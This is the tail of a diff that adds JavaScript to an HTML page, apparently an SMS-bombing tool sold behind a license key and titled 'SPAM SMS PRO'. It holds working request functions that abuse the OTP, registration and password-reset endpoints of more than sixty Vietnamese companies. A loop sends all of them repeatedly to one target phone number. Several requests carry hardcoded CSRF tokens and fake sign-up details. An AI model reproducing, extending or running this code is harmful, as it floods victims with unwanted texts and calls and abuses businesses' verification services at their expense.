+            body: JSON.stringify({ phoneNumber: phone, otpType: 0, fromSys: 'WEBKHLC' })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 26. LongChau1
+        (phone) => fetch('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ phoneNumber: phone, otpType: 1, fromSys: 'WEBKHLC' })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 27. GalaxyPlay
+        (phone) => fetch('https://api.glxplay.io/account/phone/checkPhoneOnly?phone=' + encodeURIComponent(phone), {
+            method: 'POST',
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 28. Emart
+        (phone) => fetch('https://emartmall.com.vn/index.php?route=account/register/smsRegister', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: 'mobile=' + encodeURIComponent(phone)
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 29. Ahamove
+        (phone) => fetch('https://api.ahamove.com/api/v3/public/user/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json;charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ mobile: phone, country_code: 'VN', firebase_sms_auth: true })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 30. ViettelMoney
+        (phone) => fetch('https://api8.viettelpay.vn/customer/v2/accounts/register', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Viettel Money/8.8.8' },
+            body: JSON.stringify({ identityType: 'msisdn', identityValue: phone, type: 'REGISTER' })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 31. XanhSM
+        (phone) => {
+            let p = phone;
+            if (p.startsWith('09') || p.startsWith('03')) p = '+84' + p.substring(1);
+            return fetch('https://api.gsm-api.net/auth/v1/public/otp/send?aud=user_app&platform=ios', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'User-Agent': 'UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2)' },
+                body: JSON.stringify({ is_forgot_password: false, phone: p, provider: 'VIET_GUYS' })
+            }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL');
+        },
+        // 32. XanhSM_Zalo
+        (phone) => {
+            let p = phone;
+            if (p.startsWith('09') || p.startsWith('03')) p = '+84' + p.substring(1);
+            return fetch('https://api.gsm-api.net/auth/v1/public/otp/send?aud=user_app&platform=ios', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'User-Agent': 'UserApp/3.15.0' },
+                body: JSON.stringify({ is_forgot_password: false, phone: p, provider: 'ZNS_ZALO' })
+            }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL');
+        },
+        // 33. Popeyes
+        (phone) => fetch('https://api.popeyes.vn/api/v1/register', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ phone: phone, firstName: 'Nguyen', lastName: 'Ngoc', email: 'test@mail.com', password: 'test123' })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 34. ACHECKIN
+        (phone) => fetch('https://id.acheckin.vn/api/graphql/v2/mobile', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'AppotaHome/29 CFNetwork/1474 Darwin/23.0.0' },
+            body: JSON.stringify({ operationName: 'RequestVoiceOTP', variables: { phone_number: phone, action: 'REGISTER', hash: '6af5e4ed78ee57fe21f0d405c752798f' }, query: 'mutation RequestVoiceOTP($phone_number: String!, $action: REQUEST_VOICE_OTP_ACTION!, $hash: String!) { requestVoiceOTP(phone_number: $phone_number, action: $action, hash: $hash) }' })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 35. Watsons
+        (phone) => fetch('https://www10.watsons.vn/api/v2/wtcvn/forms/mobileRegistrationForm/steps/wtcvn_mobileRegistrationForm_step1/validateAndPrepareNextStep?lang=vi', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'WTCVN/24050.8.0 (iOS/17.0.2)' },
+            body: JSON.stringify({ otpTokenRequest: { action: 'REGISTRATION', type: 'SMS', countryCode: '84', target: phone }, defaultAddress: { mobileNumberCountryCode: '84', mobileNumber: phone }, mobileNumber: phone })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 36. HoangPhuc
+        (phone) => fetch('https://hoang-phuc.com/advancedlogin/otp/sendotp/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: 'action_type=1&tel=' + encodeURIComponent(phone)
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 37. FMcom
+        (phone) => fetch('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json;charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ Phone: phone, LatOfMap: '106', LongOfMap: '108', Browser: '' })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 38. Reebok
+        (phone) => fetch('https://reebok-api.hsv-tech.io/client/phone-verification/request-verification', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ phoneNumber: phone })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 39. TheFaceShop
+        (phone) => fetch('https://tfs-api.hsv-tech.io/client/phone-verification/request-verification', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ phoneNumber: phone })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 40. BeautyBox
+        (phone) => fetch('https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ phoneNumber: phone })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 41. Futabus
+        (phone) => fetch('https://api.vato.vn/api/authenticate/request_code', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ phoneNumber: phone, deviceId: 'd46a74f1-09b9-4db6-b022-aaa9d87e11ed', use_for: 'LOGIN' })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 42. ViettelPost
+        (phone) => fetch('https://id.viettelpost.vn/Account/SendOTPByPhone', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: 'FormRegister.FullName=Nguyen+Quang+Ngoc&FormRegister.Phone=' + encodeURIComponent(phone) + '&FormRegister.Password=test123&FormRegister.ConfirmPassword=test123&ReturnUrl=/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=3r25st1hpummjj42ig7zmt&ConfirmOtpType=Register&FormRegister.IsRegisterFromPhone=true&__RequestVerificationToken=CfDJ8ASZJlA33dJMoWx8wnezdv8kQF_TsFhcp3PSmVMgL4cFBdDdGs-g35Tm7OsyC3m_0Z1euQaHjJ12RKwIZ9W6nZ9ByBew4Qn49WIN8i8UecSrnHXhWprzW9hpRmOi4k_f5WQbgXyA9h0bgipkYiJjfoc'
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 43. MyViettel2
+        (phone) => fetch('https://viettel.vn/api/get-otp-contract-mobile', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json;charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ msisdn: phone, type: 'register' })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 44. MyViettel3
+        (phone) => fetch('https://viettel.vn/api/get-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json;charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ msisdn: phone })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 45. TokyoLife
+        (phone) => fetch('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ phone_number: phone, name: 'Nguyen Quang Ngoc', password: 'test123', email: 'test@mail.com', birthday: '2002-03-12', gender: 'male' })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 46. 30shine
+        (phone) => fetch('https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ phone: phone })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 47. Cathaylife
+        (phone) => fetch('https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: 'memberMap=' + encodeURIComponent('{"userName":"test@mail.com","password":"test123","birthday":"03/07/2001","certificateNumber":"034202008372","phone":"' + phone + '","email":"test@mail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"Nguyen Quang Ngoc"}') + '&OTP_TYPE=P&LANGS=vi_VN'
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 48. Dominos
+        (phone) => fetch('https://dominos.vn/api/v1/users/send-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ phone_number: phone, email: 'test@mail.com', type: 0, is_register: true })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 49. Vinamilk
+        (phone) => fetch('https://new.vinamilk.com.vn/api/account/getotp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'text/plain;charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ type: 'register', phone: phone })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 50. Batdongsan
+        (phone) => fetch('https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber=' + encodeURIComponent(phone), {
+            method: 'GET',
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 51. GUMAC
+        (phone) => fetch('https://cms.gumac.vn/api/v1/customers/verify-phone-number', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ phone: phone })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 52. FAHASA
+        (phone) => fetch('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: 'phone=' + encodeURIComponent(phone)
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 53. Hopiness
+        (phone) => fetch('https://shopiness.vn/ajax/user', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'X-Requested-With': 'XMLHttpRequest' },
+            body: 'action=verify-registration-info&phoneNumber=' + encodeURIComponent(phone) + '&refCode='
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 54. Modcha35
+        (phone) => fetch('https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'mocha/1.28 (iPhone; iOS 17.0.2; Scale/3.00)' },
+            body: 'clientType=ios&countryCode=VN&device=iPhone15,3&os_version=iOS_17.0.2&platform=ios&revision=11224&username=' + encodeURIComponent(phone) + '&version=1.28'
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 55. Bibabo
+        (phone) => fetch('https://one.bibabo.vn/api/v1/login/otp/createOtp?phone=' + encodeURIComponent(phone) + '&reCaptchaToken=undefined&appId=7&version=2', {
+            method: 'GET',
+            headers: { 'User-Agent': 'bibabo/522 CFNetwork/1474 Darwin/23.0.0' }
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 56. MOCA
+        (phone) => fetch('https://moca.vn/moca/v2/users/role?phoneNumber=' + encodeURIComponent(phone), {
+            method: 'GET',
+            headers: { 'User-Agent': 'Pass/2.10.156 (iPhone; iOS 17.0.2; Scale/3.00)' }
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 57. Pantio
+        (phone) => fetch('https://api.suplo.vn/v1/auth/customer/otp/sms/generate?domain=pantiofashion.myharavan.com', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: 'phoneNumber=' + encodeURIComponent(phone)
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 58. Routine
+        (phone) => fetch('https://routine.vn/customer/otp/send/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: 'telephone=' + encodeURIComponent(phone) + '&isForgotPassword=0'
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 59. VayVND
+        (phone) => fetch('https://api.vayvnd.vn/v2/users/password-reset', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'site-id': '3' },
+            body: JSON.stringify({ login: phone, trackingId: 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2' })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 60. Tima
+        (phone) => fetch('https://tima.vn/Borrower/RegisterLoanCreditFast', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: 'application_full_name=Nguyen+Van+A&application_mobile_phone=' + encodeURIComponent(phone) + '&CityId=1&DistrictId=16&rules=true&TypeTime=1&application_amount=0&application_term=0&UsertAgent=Mozilla/5.0&IsApply=1&ProvinceName=Thanh+pho+Ha+Noi&DistrictName=Huyen+Soc+Son&product_id=2'
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 61. Moneygo
+        (phone) => fetch('https://moneygo.vn/dang-ki-vay-nhanh', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: '_token=X7pFLFlcnTEmsfjHE5kcPA1KQyhxf6qqL6uYtWCV&total=56688000&phone=' + encodeURIComponent(phone) + '&agree=1'
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 62. Takomo
+        (phone) => fetch('https://lk.takomo.vn/api/4/client/otp/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json;charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ data: { phone: phone, code: 'resend', channel: 'ivr' } })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 63. Paynet
+        (phone) => fetch('https://merchant.paynetone.vn/User/GetOTP', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: 'MobileNumber=' + encodeURIComponent(phone) + '&IsForget=N'
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 64. Pico
+        (phone) => fetch('https://auth.pico.vn/user/api/auth/login/request-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ phone: phone })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 65. PNJ
+        (phone) => fetch('https://www.pnj.com.vn/customer/otp/request', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: '_method=POST&_token=0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU&type=zns&phone=' + encodeURIComponent(phone)
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 66. TINIWORLD
+        (phone) => fetch('https://prod-tini-id.nkidworks.com/auth/tinizen', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: '_csrf=&clientId=609168b9f8d5275ea1e262d6&redirectUrl=https://tiniworld.com&phone=' + encodeURIComponent(phone)
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL')
+    ];
+
+    // Danh sách tên service
+    const serviceNames = [
+        'Sapo', 'Viettel', 'Medicare', 'TV360', 'DienMayXanh', 'KingFood', 'Mocha',
+        'FPT_DK', 'FPT_MK', 'VIEON', 'GHN', 'LotteMart', 'DONGCRE', 'Shopee', 'TGDD',
+        'FPTSHOP', 'WinMart', 'Vietloan', 'Lozi', 'F88', 'Spacet', 'Vinpearl', 'Traveloka',
+        'Dongplus', 'LongChau', 'LongChau1', 'GalaxyPlay', 'Emart', 'Ahamove', 'ViettelMoney',
+        'XanhSM', 'XanhSM_Zalo', 'Popeyes', 'ACHECKIN', 'Watsons', 'HoangPhuc', 'FMcom',
+        'Reebok', 'TheFaceShop', 'BeautyBox', 'Futabus', 'ViettelPost', 'MyViettel2',
+        'MyViettel3', 'TokyoLife', '30shine', 'Cathaylife', 'Dominos', 'Vinamilk',
+        'Batdongsan', 'GUMAC', 'FAHASA', 'Hopiness', 'Modcha35', 'Bibabo', 'MOCA',
+        'Pantio', 'Routine', 'VayVND', 'Tima', 'Moneygo', 'Takomo', 'Paynet', 'Pico',
+        'PNJ', 'TINIWORLD'
+    ];
+
+    // ----- HÀM SPAM CHÍNH (có key check) -----
+    async function runSpam(phone, count) {
+        if (running) {
+            addLog('⚠️ Đang chạy, vui lòng đợi hoặc nhấn Dừng', 'fail');
+            return;
+        }
+        if (!validateKey(apiKeyInput.value.trim())) {
+            addLog('❌ Key không hợp lệ. Nhập key: OTP-*, DEMO-OTP*, PRO-*, VIP-*', 'fail');
+            return;
+        }
+        if (!phone || phone.length < 9) {
+            addLog('❌ Số điện thoại không hợp lệ', 'fail');
+            return;
+        }
+        let total = parseInt(count) || 1;
+        if (total < 1) total = 1;
+        if (total > 15) total = 15;
+
+        running = true;
+        stopRequested = false;
+        addLog(`🚀 Bắt đầu spam ${total} lượt cho ${phone} (Key: ${apiKeyInput.value.trim().substring(0,6)}...)`, 'info');
+
+        for (let i = 0; i < total; i++) {
+            if (stopRequested) break;
+            addLog(`--- Lượt ${i+1}/${total} ---`, 'info');
+            for (let j = 0; j < spamFunctions.length; j++) {
+                if (stopRequested) break;
+                try {
+                    const result = await spamFunctions[j](phone);
+                    const name = serviceNames[j] || 'Service';
+                    if (result === 'OK') {
+                        addLog(`✅ ${name} -> Gửi thành công`, 'success');
+                    } else {
+                        addLog(`❌ ${name} -> Thất bại`, 'fail');
+                    }
+                } catch (e) {
+                    const name = serviceNames[j] || 'Service';
+                    addLog(`⚠️ ${name} -> Lỗi: ${e.message || 'unknown'}`, 'fail');
+                }
+                await new Promise(r => setTimeout(r, 120));
+            }
+            if (i < total - 1 && !stopRequested) {
+                addLog(`⏳ Chờ 1.5s...`, 'info');
+                await new Promise(r => setTimeout(r, 1500));
+            }
+        }
+        running = false;
+        if (stopRequested) {
+            addLog('⏹️ Đã dừng theo yêu cầu', 'fail');
+        } else {
+            addLog('🏁 Hoàn thành!', 'success');
+        }
+    }
+
+    // ----- SỰ KIỆN START -----
+    startBtn.addEventListener('click', function() {
+        const phone = phoneInput.value.trim();
+        const count = parseInt(countInput.value) || 2;
+        runSpam(phone, count);
+    });
+
+    // Khởi tạo
+    setTimeout(() => {
+        updateKeyStatus();
+        addLog('🔥 SPAM SMS PRO • Key-Auth sẵn sàng (65+ services)', 'info');
+    }, 300);
+})();
+</script>
 </body>
 </html>
